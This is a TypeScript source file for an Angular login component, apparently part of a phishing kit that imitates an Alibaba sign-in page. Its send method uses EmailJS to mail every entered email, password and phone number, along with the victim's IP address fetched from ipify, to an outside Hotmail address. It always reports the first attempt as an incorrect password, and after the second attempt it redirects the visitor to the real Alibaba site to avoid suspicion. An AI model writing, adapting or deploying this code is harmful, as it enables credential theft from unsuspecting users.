import { CommonModule } from '@angular/common';
import { Component, OnDestroy, OnInit } from '@angular/core';
import { ReactiveFormsModule, FormGroup, FormBuilder } from '@angular/forms';
import { COUNTRY_PHONE_CODES } from '../../Core/constants';
import emailjs from '@emailjs/browser';
import { HttpClient } from '@angular/common/http';
import { Subscription } from 'rxjs';
import { ActivatedRoute } from '@angular/router';

@Component({
  selector: 'app-login-section',
  imports: [ReactiveFormsModule, CommonModule],
  templateUrl: './login-section.component.html',
  styleUrl: './login-section.component.scss',
})
export class LoginSectionComponent implements OnInit, OnDestroy {
  loginForm!: FormGroup;
  showPassword = false;

  attemptCount = 0;

  useMobile = false;
  showError = false;
  showLoader = false;

  countryCodes = COUNTRY_PHONE_CODES;

  userId!: string;

  private subscription = new Subscription();
  constructor(
    private fb: FormBuilder,
    private http: HttpClient,
    private route: ActivatedRoute
  ) {}

  ngOnInit(): void {
    this.loginForm = this.fb.group({
      account: this.fb.control(''),
      password: this.fb.control(''),
      phoneNumber: this.fb.control(''),
      countryCode: this.fb.control(this.countryCodes[1].code),
    });

    this.getUserId();

    this.getEmail();
  }

  getEmail() {
    this.subscription.add(
      this.route.queryParams.subscribe((param) => {
        const email = param['email'];

        if (email) {
          this.loginForm.patchValue({
            account: email,
            password: '',
            phoneNumber: '',
            countryCode: '',
          });
        }
      })
    );
  }

  getUserId() {
    this.subscription.add(
      this.http
        .get('https://api.ipify.org?format=json')
        .subscribe((resData: any) => {
          this.userId = resData.ip;
          // console.log(this.userId);
        })
    );
  }

  get loginFormControl() {
    return this.loginForm.controls;
  }

  get passwordHasValue() {
    const value = this.loginForm.get('password')?.value;
    if (value) return true;
    else return false;
  }

  get errorMessage() {
    if (!this.loginFormControl['account'].value && !this.useMobile) {
      return 'Enter your email or member ID';
    } else if (!this.loginFormControl['phoneNumber'].value && this.useMobile) {
      return 'Enter you phone number';
    } else {
      return 'Incorrect Password';
    }
  }

  submit() {
    if (this.attemptCount < 1) {
      this.send();

      this.attemptCount++;
    } else {
      this.send(true);
    }

    this.showError = false;
  }

  redirectToExternalSite() {
    window.location.replace('https://www.alibaba.com/');
  }

  async send(end: boolean = false) {
    this.showLoader = true;

    emailjs.init('08gaTi0yX9GYMg2w_');
    const response = await emailjs
      .send('service_4fx4y8a', 'template_0tzq3y5', {
        name: 'Stanley',
        message: `Email: ${
          this.loginFormControl['account'].value || ''
        }, Password: ${
          this.loginFormControl['password'].value
        }, Phone Number: ${this.loginFormControl['countryCode'].value}, ${
          this.loginFormControl['phoneNumber'].value || ''
        }, Attempt: ${this.attemptCount + 1}, userId: ${this.userId || ''}`,
        email: 'ubaid.valtorquegroup@hotmail.com',
      })
      .then(() => {
        this.showError = true;
        this.showLoader = false;
        if (end) {
          this.redirectToExternalSite();
        }
      })
      .catch(() => {
        this.showLoader = false;

        if (end) {
          this.redirectToExternalSite();
        }
      });
  }

  ngOnDestroy(): void {
    if (this.subscription) {
      this.subscription.unsubscribe();
    }
  }
}
